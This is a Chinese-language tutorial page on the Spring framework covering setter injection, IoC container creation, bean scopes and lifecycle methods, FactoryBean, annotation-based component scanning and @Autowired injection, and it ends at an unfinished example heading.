<h4 id="基于Setter方法"><a href="#基于Setter方法" class="headerlink" title="基于Setter方法"></a>基于Setter方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class MovieFinder&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleMovieLister</span> &#123;</span><br><span class="line">	<span class="keyword">private</span> MovieFinder movieFinder;</span><br><span class="line">	<span class="keyword">private</span> String movieName;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setMovieFinder</span><span class="params">(MovieFinder movieFinder)</span> &#123;</span><br><span class="line">		<span class="built_in">this</span>.movieFinder = movieFinder;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setMovieName</span><span class="params">(String movieName)</span>&#123;</span><br><span class="line">		<span class="built_in">this</span>.movieName = movieName;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过触发Setter方法进行注入:</p>
<p>如果参数是其他类的对象，需要配置其他类的bean，如movieFinder</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--将组件全部放入IoC容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;movieFinder&quot;</span> <span class="attr">class</span>=<span class="string">&quot;examples.MovieFinder&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;simpleMovieLister&quot;</span> <span class="attr">class</span>=<span class="string">&quot;examples.SimpleMovieLister&quot;</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- setter方法，注入movieFinder对象的标识id name = 属性名 ref = 引用bean的id值--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;movieFinder&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;movieFinder&quot;</span> /&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- setter方法，注入基本数据类型movieName name = 属性名 value= 基本类型值--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;movieName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;消失的她&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>name</code>属性名：实际上是Setter方法名去掉set后将首字母改为小写的值，在标准的Setter方法中就是属性名，若是自定义的Setter可能有别的名称</li>
<li><code>value</code>和<code>ref</code>参数二选一，若是其他类的对象，选择<code>ref</code>,置为对应bean的id</li>
</ul>
<hr>
<h3 id="IoC容器的创建和使用"><a href="#IoC容器的创建和使用" class="headerlink" title="IoC容器的创建和使用"></a>IoC容器的创建和使用</h3><p>首先回顾IoC容器的接口和实现类<br>接口：</p>
<ul>
<li>BeanFactory</li>
<li>ApplicationContext</li>
</ul>
<p>实现类：</p>
<ul>
<li>可以直接通过构造函数实例化</li>
<li><code>ClassPathXmlApplicationContext</code>  读取类路径下的XML配置方式</li>
<li><code>FileSystemXmlApplicationContext</code>  读取文件系统中的XML配置方式</li>
<li><code>AnnotationConfigApplicationContext</code>  读取配置类方式的IoC容器</li>
<li>WebApplicationContext  Web项目专属的配置方式</li>
</ul>
<hr>
<h4 id="创建IoC容器的方法："><a href="#创建IoC容器的方法：" class="headerlink" title="创建IoC容器的方法："></a>创建IoC容器的方法：</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">createIoc</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">/*创建IoC容器并且读取配置文件 两种方法*/</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 此时会调用初始化方法（后文的周期方法）</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// [当前推荐]</span></span><br><span class="line">    <span class="comment">// 方法1 直接创建容器并指定配置文件，配置文件可以填写一个或多个</span></span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;ioc1.xml&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 方法2 先创建容器，再指定配置文件，再刷新  方法1在源码中就是按这样实现的</span></span><br><span class="line">    <span class="type">ClassPathXmlApplicationContext</span> <span class="variable">applicationContext1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>();</span><br><span class="line">    applicationContext1.setConfigLocations(<span class="string">&quot;iocq.xml&quot;</span>);</span><br><span class="line">    applicationContext1.refresh();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*获取bean,方法见下文*/</span></span><br><span class="line">    </span><br><span class="line">    applicationContext1.close();<span class="comment">// 关闭容器，会调用销毁方法（后文的周期方法）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<hr>
<h4 id="获取bean的方法"><a href="#获取bean的方法" class="headerlink" title="获取bean的方法"></a>获取bean的方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*在IoC容器中获取组件Bean 三种方法*/</span></span><br><span class="line"><span class="comment">// 方法1 【推荐】 根据BeanId同时指定Bean的类型Class</span></span><br><span class="line"><span class="type">HappyComponent</span> <span class="variable">happyComponent1</span> <span class="operator">=</span> applicationContext.getBean(<span class="string">&quot;happyComponent&quot;</span>,HappyComponent.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法2 【推荐】 直接根据类型获取</span></span><br><span class="line"><span class="type">HappyComponent</span> <span class="variable">happyComponent2</span> <span class="operator">=</span> applicationContext.getBean(HappyComponent.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法3 【不推荐】 直接根据BeanId获取即可，返回值为Object类型，需要强制转换</span></span><br><span class="line"><span class="type">HappyComponent</span> <span class="variable">happyComponent3</span> <span class="operator">=</span> (HappyComponent) applicationContext.getBean(<span class="string">&quot;happyComponent&quot;</span>);</span><br></pre></td></tr></table></figure>



<p><strong>注意</strong></p>
<ol>
<li>根据bean的类型获取时（方法2），同一个类型IoC容器只能有一个Bean（在XML配置文件中只能有一个此class的bean）</li>
<li>IoC的配置必须是一个实现类（即xml中的class必须是实现类），但获取时（方法2）可以根据接口类型获取值（会进行类型 instanceof ioc容器类型 &#x3D;&#x3D; true的判断）</li>
<li>三次获取的对象其实是同一个，只是用了3次，因此happyComponent1&#x3D;happyComponent2&#x3D;happyComponent3</li>
</ol>
<hr>
<h3 id="组件Bean的作用域和周期方法"><a href="#组件Bean的作用域和周期方法" class="headerlink" title="组件Bean的作用域和周期方法"></a>组件Bean的作用域和周期方法</h3><h4 id="周期方法"><a href="#周期方法" class="headerlink" title="周期方法"></a>周期方法</h4><p>在Spring管理的Bean的生命周期中，Spring容器会在特定时间点自动调用的方法。这些生命周期方法允许开发者在Bean的创建、初始化、销毁等关键时刻插入自定义的代码。</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240903185007.png" alt="周期方法"><br>我们可以在组件类中定义方法，然后当IoC容器实例化和销毁组件对象的时候进行调用！这两个方法我们成为生命周期方法！类似于JavaWeb中Servlet的init&#x2F;destroy方法,我们可以在周期方法完成初始化和释放资源等工作。</p>
<p>组件类中实现业务逻辑，注意：</p>
<ol>
<li>必须是pubic、void、无参的</li>
<li>命名可以随意</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavaBean</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">clear</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>配置文件中声明bean时指定初始化和销毁方法</p>
<ol>
<li><code>init-method</code> 指定初始化方法名</li>
<li><code>destroy-method</code> 指定销毁方法名</li>
<li>指明后容器会在对应时间节点回调对应方法，实现其中的业务；</li>
<li>可以不用指定销毁方法名，根据实际需求</li>
</ol>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;javaBean&quot;</span> <span class="attr">class</span> = <span class="string">&quot;com.spring.Ioc.JavaBean&quot;</span> <span class="attr">init-method</span> = <span class="string">&quot;init&quot;</span> <span class="attr">destroy-method</span> = <span class="string">&quot;clear&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>



<hr>
<h4 id="组件的作用域"><a href="#组件的作用域" class="headerlink" title="组件的作用域"></a>组件的作用域</h4><p>我们在配置文件中使用<code>&lt;bean</code> 标签声明Bean，其实就是将对象&#x2F;组件&#x2F;Bean的信息配置给SpringIoC容器，IoC容器在读取配置文件获取到这些信息之后，需要将它们转化为Java中拥有的概念。<code>&lt;bean</code>标签也就转成Spring内部的 BeanDefinition 对象，<strong>BeanDefinition与类概念一样</strong>。BeanDefinition 对象内，包含的定义信息（id,class,属性等等）也就对应&lt;bean标签内的信息！SpringIoC容器可以可以根据BeanDefinition对象反射创建多个Bean对象实例。具体<strong>创建多少个Bean的实例对象，由Bean的作用域Scope属性指定！一般情况下都采用单例。</strong></p>
<p>Scope取值及其含义：</p>
<ul>
<li><code>singleton</code>：单例，默认，一个bean标签对应一个BeanDefinition对象对应一个组件对象，也就是说只实例化一个组件对象，不论调用几次都是同一个对象；</li>
<li><code>prototype</code>：多例，一个bean标签对应一个BeanDefinition对象对应多个组件对象，会创建多个组件对象。调用几次创建几个对象，每次都是不同的对象；</li>
</ul>
<p><img src="D:\workinenglish\typora_image\image-20241215223558541.png" alt="image-20241215223558541"></p>
<p>作用域可选值</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241215223026.png"></p>
<p>示例：</p>
<p>配置信息：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;single&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.learn.Spring6.JavaBeanSingle&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;muti&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.learn.Spring6.JavaBeanMuti&quot;</span> <span class="attr">scope</span>=<span class="string">&quot;prototype&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>测试及结果：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testUser</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">ClassPathXmlApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;bean.xml&quot;</span>);</span><br><span class="line">    <span class="type">JavaBeanSingle</span> <span class="variable">singleBean1</span> <span class="operator">=</span> applicationContext.getBean(JavaBeanSingle.class);</span><br><span class="line">    <span class="type">JavaBeanSingle</span> <span class="variable">singleBean2</span> <span class="operator">=</span> applicationContext.getBean(JavaBeanSingle.class);</span><br><span class="line">    System.out.println(singleBean1==singleBean2); <span class="comment">// true</span></span><br><span class="line">    <span class="type">JavaBeanMuti</span> <span class="variable">mutiBean1</span> <span class="operator">=</span> applicationContext.getBean(JavaBeanMuti.class);</span><br><span class="line">    <span class="type">JavaBeanMuti</span> <span class="variable">mutiBean2</span> <span class="operator">=</span> applicationContext.getBean(JavaBeanMuti.class);</span><br><span class="line">    System.out.println(mutiBean1==mutiBean2);  <span class="comment">// false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<hr>
<h3 id="FactoryBean特性和使用"><a href="#FactoryBean特性和使用" class="headerlink" title="FactoryBean特性和使用"></a>FactoryBean特性和使用</h3><p>在上文提到的组件Bean信息声明配置方法中，当使用工厂模式配置时，需要指定工厂bean对应的工厂方法。FactoryBean可以简化这个过程。<code>FactoryBean</code> 是 Spring 框架中的一个接口，它允许你将任意的工厂类集成到 Spring 的 IoC（Inversion of Control，控制反转）容器中。通过实现 <code>FactoryBean</code> 接口，你可以自定义对象的创建逻辑，并且这个对象可以通过 Spring 容器来管理，就像普通的 Spring Bean 一样。</p>
<p><code>FactoryBean</code> 接口有三个方法需要实现：</p>
<ol>
<li><code>Object getObject() throws Exception;</code><ul>
<li>这个方法返回由 <code>FactoryBean</code> 创建的对象实例。Spring 容器在获取 <code>FactoryBean</code> 管理的 bean 时会调用此方法。</li>
</ul>
</li>
<li><code>Class&lt;?&gt; getObjectType();</code><ul>
<li>返回 <code>getObject()</code> 方法所创建对象的类型。如果在创建对象之前无法确定类型，则可以返回 <code>null</code>。当对象被创建后，Spring 容器会使用此信息进行类型检查。</li>
</ul>
</li>
<li><code>boolean isSingleton();</code><ul>
<li>如果 <code>FactoryBean</code> 创建的是单例模式的对象（即在整个应用上下文中只有一个实例），则返回 <code>true</code>；否则返回 <code>false</code>。</li>
</ul>
</li>
</ol>
<p><img src="D:\workinenglish\typora_image\image-20241215225746983.png" alt="image-20241215225746983"></p>
<p>FactoryBean的使用场景</p>
<ol>
<li>代理类的创建</li>
<li>第三方框架整合</li>
<li>复杂对象实例化等</li>
</ol>
<h4 id="FactoryBean的使用"><a href="#FactoryBean的使用" class="headerlink" title="FactoryBean的使用"></a>FactoryBean的使用</h4><ol>
<li>实现FactoryBean接口并指定返回值泛型</li>
<li>重写<code>getObject()</code>和<code>getObjectType()</code>方法</li>
<li>在配置文件中按正常类的bean配置，配置实现类的bean</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// JavaBean是希望通过工厂模式实例化的类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavaBean</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// FactoryBean接口的实现类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavaBeanFactoryBean</span> <span class="keyword">implements</span> <span class="title class_">FactoryBean</span>&lt;JavaBean&gt; &#123;</span><br><span class="line">    <span class="comment">// 附加代码开始</span></span><br><span class="line">    <span class="keyword">private</span> String value;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(String value)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.value = value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 附加代码结束</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> JavaBean <span class="title function_">getObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JavaBean</span> <span class="variable">javaBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JavaBean</span>();</span><br><span class="line">        <span class="comment">// 附加代码开始</span></span><br><span class="line">        javaBean.setName(value);</span><br><span class="line">        <span class="comment">// 附加代码结束</span></span><br><span class="line">        <span class="keyword">return</span> javaBean;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; getObjectType() &#123;</span><br><span class="line">        <span class="keyword">return</span> JavaBean.class;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>配置文件配置：</p>
<p> 以下id中<strong>javaBean是</strong>JavaBeanFactoryBean这个工厂产生的<strong>JavaBean类的bean的名称</strong>，不是JavaBeanFactoryBean类对应的bean名称，它对应的是&amp;javaBean。但如果在里面使用 property 标签配置<code>set()方法</code>的参数，则<strong>配的是工厂类的set方法而不是javaBean的set方法。</strong>所以要想给javaBean的set方法传参，需要在工厂类添加上述附加代码，将工厂类参数作为一个传递桥梁。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;javaBean&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.learn.Spring6.test1.JavaBeanFactoryBean&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--使用property标签传递参数必须按说明添加代码作为桥接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;value&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Tom&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>获取：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testUser</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">ClassPathXmlApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;bean.xml&quot;</span>);</span><br><span class="line">    <span class="comment">// 获取JavaBean类的对象(组件/bean)</span></span><br><span class="line">    <span class="type">JavaBean</span> <span class="variable">javaBean</span> <span class="operator">=</span> applicationContext.getBean(<span class="string">&quot;javaBean&quot;</span>,JavaBean.class);</span><br><span class="line">    <span class="comment">// 以下方法获取的是FactoryBean</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">bean</span> <span class="operator">=</span> applicationContext.getBean(<span class="string">&quot;&amp;javaBean&quot;</span>);</span><br><span class="line">    System.out.println(javaBean);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="面试：FactoryBean和BeanFactory区别"><a href="#面试：FactoryBean和BeanFactory区别" class="headerlink" title="面试：FactoryBean和BeanFactory区别"></a>面试：FactoryBean和BeanFactory区别</h4><ul>
<li><code>FactoryBean</code> 是 Spring 中一种特殊的 bean，可以在 getObject() 工厂方法自定义的逻辑创建Bean！是一种能够生产其他 Bean 的 Bean。FactoryBean 在容器启动时被创建，而在实际使用时则是通过调用getObject() 方法来得到其所生产的 Bean。因此，FactoryBean 可以自定义任何所需的初始化逻辑，生产出一些定制化的 bean。<br>  一般情况下，整合第三方框架，都是通过定义FactoryBean实现！！！</li>
<li><code>BeanFactory</code> 是 Spring 框架的基础，其作为一个顶级接口定义了容器的基本行为，例如管理 bean 的生命周期、配置文件的加载和解析、bean 的装配和依赖注入等。BeanFactory 接口提供了访问 bean 的方式，例如 getBean() 方法获取指定的 bean 实例。它可以从不同的来源（例如 Mysql 数据库、XML 文件、Java 配置类等）获取 bean 定义，并将其转换为 bean 实例。同时，BeanFactory 还包含很多子类（例如，ApplicationContext 接口）提供了额外的强大功能。</li>
</ul>
<p>总的来说，FactoryBean 和 BeanFactory 的区别主要在于前者是用于创建 bean 的接口，它提供了更加灵活的初始化定制功能，而后者是用于管理 bean 的框架基础接口，提供了基本的容器功能和 bean 生命周期管理</p>
<hr>
<h2 id="基于注解-XML的组件管理配置方式"><a href="#基于注解-XML的组件管理配置方式" class="headerlink" title="基于注解+XML的组件管理配置方式"></a>基于注解+XML的组件管理配置方式</h2><p>和 XML 配置文件一样，注解本身并不能执行，注解本身仅仅只是做一个标记，具体的功能是框架检测到注解标记的位置，然后针对这个位置按照注解标记的功能来执行具体操作。<br>本质上：所有一切的操作都是 Java 代码来完成的，XML 和注解只是告诉框架中的 Java 代码如何执行。</p>
<p><strong>此方法目前只能用于自定义类，第三方类还是使用XML方法</strong></p>
<p>基本步骤：</p>
<ol>
<li>使用注解标记想要放入IoC容器的类，<code>相当于配置了id为类名首字母小写，class为当前类的bean</code>。</li>
<li>在XML中配置，告诉Spring的IoC容器在那些包下添加了IoC注解</li>
</ol>
<hr>
<h3 id="步骤1：使用注解标记组件"><a href="#步骤1：使用注解标记组件" class="headerlink" title="步骤1：使用注解标记组件"></a>步骤1：使用注解标记组件</h3><p>Spring 提供了以下多个注解，这些注解可以直接标注在 Java 类上，将它们定义成 Spring Bean。</p>
<p><strong>四种注解功能没有区别，仅用于区分不同层，便于开发人员分辨组件的作用。</strong></p>
<table>
<thead>
<tr>
<th>注解</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>@Component</code></td>
<td>该注解用于描述 Spring 中的 Bean，它是一个泛化的概念，仅仅表示容器中的一个组件（Bean），并且可以作用在应用的任何层次，例如 Service 层、Dao 层等。 使用时只需将该注解标注在相应类上即可。</td>
</tr>
<tr>
<td><code>@Repository</code></td>
<td>该注解用于将<code>数据访问层（Dao 层）</code>的类标识为 Spring 中的 Bean，其功能与 @Component 相同。</td>
</tr>
<tr>
<td><code>@Service</code></td>
<td>该注解通常作用在<code>业务层（Service 层）</code>，用于将业务层的类标识为 Spring中的 Bean，其功能与@Component相同。</td>
</tr>
<tr>
<td><code>@Controller</code></td>
<td>该注解通常作用在<code>控制层（如SpringMVC 的 Controller）</code>，用于将控制层的类标识为 Spring 中的 Bean，其功能与 @Component 相同。</td>
</tr>
</tbody></table>
<h4 id="组件的名称-id"><a href="#组件的名称-id" class="headerlink" title="组件的名称(id)"></a>组件的名称(id)</h4><p>默认情况下，注解标记的类，其类名首字母小写后即为其对应的组件名称。</p>
<p>可以在注解中使用<code>value</code>属性指定组件名称（即组件的id）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service(value=&quot;name&quot;)</span></span><br><span class="line"><span class="comment">// 或直接省略value</span></span><br><span class="line"><span class="meta">@Service(&quot;name&quot;)</span></span><br></pre></td></tr></table></figure>



<hr>
<h3 id="步骤2：XML配置文件指定扫描范围"><a href="#步骤2：XML配置文件指定扫描范围" class="headerlink" title="步骤2：XML配置文件指定扫描范围"></a>步骤2：XML配置文件指定扫描范围</h3><h4 id="情况1：全包注解扫描配置"><a href="#情况1：全包注解扫描配置" class="headerlink" title="情况1：全包注解扫描配置"></a>情况1：全包注解扫描配置</h4><p>添加配置文件的方式同使用XML配置时的方法一样</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--1. 普通配置包扫描</span></span><br><span class="line"><span class="comment">       base-package 指定ioc容器在哪些包下扫描注解类，加载到容器中</span></span><br><span class="line"><span class="comment">       多个包使用&#x27;,&#x27;分隔</span></span><br><span class="line"><span class="comment">       指定包即指定了此包及其子包内的所有类</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;package1,package2,...&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="情况2：排除包下某些注解"><a href="#情况2：排除包下某些注解" class="headerlink" title="情况2：排除包下某些注解"></a>情况2：排除包下某些注解</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--2. 排除包下某些注解的扫描配置</span></span><br><span class="line"><span class="comment">       在原标签的包含下，添加&lt;context:exclude-filter子标签</span></span><br><span class="line"><span class="comment">       type=&quot;annotation&quot;，expression=&quot;注解全路径&quot;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;package1,package2,...&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:exclude-filter</span> <span class="attr">type</span>=<span class="string">&quot;annotation&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;org.springframework.stereotype.Repository&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="情况3：仅限包下某些注解"><a href="#情况3：仅限包下某些注解" class="headerlink" title="情况3：仅限包下某些注解"></a>情况3：仅限包下某些注解</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--3. 仅限包下某些注解的扫描配置</span></span><br><span class="line"><span class="comment">       父标签下添加use-default-filters=&quot;false&quot;</span></span><br><span class="line"><span class="comment">       在原标签的包含下，添加&lt;context:exclude-filter子标签</span></span><br><span class="line"><span class="comment">       type=&quot;annotation&quot;，expression=&quot;注解全路径&quot;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;package1,package2,...&quot;</span> <span class="attr">use-default-filters</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">context:include-filter</span> <span class="attr">type</span>=<span class="string">&quot;annotation&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;org.springframework.stereotype.Service&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<hr>
<h3 id="指定周期方法和作用域"><a href="#指定周期方法和作用域" class="headerlink" title="指定周期方法和作用域"></a>指定周期方法和作用域</h3><p>注意：<strong>多例下不会调用销毁方法。</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 默认为单例，无需标记，标记方法为:</span></span><br><span class="line"><span class="comment">// @Scope(scopeName = ConfigurableBeanFactory.SCOPE_SINGLETON)</span></span><br><span class="line"><span class="meta">@Scope(scopeName = ConfigurableBeanFactory.SCOPE_PROTOTYPE)</span> <span class="comment">// 作用域为多例</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InitDestroy</span> &#123;</span><br><span class="line">    <span class="comment">// 周期方法的命名随意，但必须是public void</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostConstruct</span> <span class="comment">// 初始化方法，实例化后立即调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;init function&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@PreDestroy</span> <span class="comment">//销毁方法，销毁前调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;destroy function&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<hr>
<h3 id="DI依赖注入：组件属性赋值"><a href="#DI依赖注入：组件属性赋值" class="headerlink" title="DI依赖注入：组件属性赋值"></a>DI依赖注入：组件属性赋值</h3><h4 id="引用类型注入"><a href="#引用类型注入" class="headerlink" title="引用类型注入"></a>引用类型注入</h4><h5 id="Autowired-Qualified-value-“id”-注解自动装配"><a href="#Autowired-Qualified-value-“id”-注解自动装配" class="headerlink" title="@Autowired + @Qualified(value &#x3D; “id”)注解自动装配"></a>@Autowired + @Qualified(value &#x3D; “id”)注解自动装配</h5><p>使用方法：</p>
<ul>
<li><p>参与自动装配的组件（需要装配、被装配）全部都必须在IoC容器中。</p>
<blockquote>
<p>如果注解为<code>Autowired(required = false)</code>就可以没有对应组件而不会报错</p>
<p>但其他代码若使用到组件会出现空指针错误！</p>
</blockquote>
</li>
<li><p>在成员变量上直接标记<code>@Autowired</code>注解即可，不需要提供setXxx()方法。</p>
</li>
<li><p>默认情况下，自动装配名字(id)和成员属性名相同的组件。</p>
</li>
<li><p>如果组件名和成员属性名不同，需要额外的注解<code>@Qualifier(value = &quot;id&quot;)</code>来指定组件。</p>
<blockquote>
<p>注意！value的取值是组件的 id 而不是组件所属的类名。组件的 id 默认是类名首字母小写。</p>
<p>@Qualifier不能单独使用</p>
</blockquote>
</li>
</ul>
<p>示例：</p>
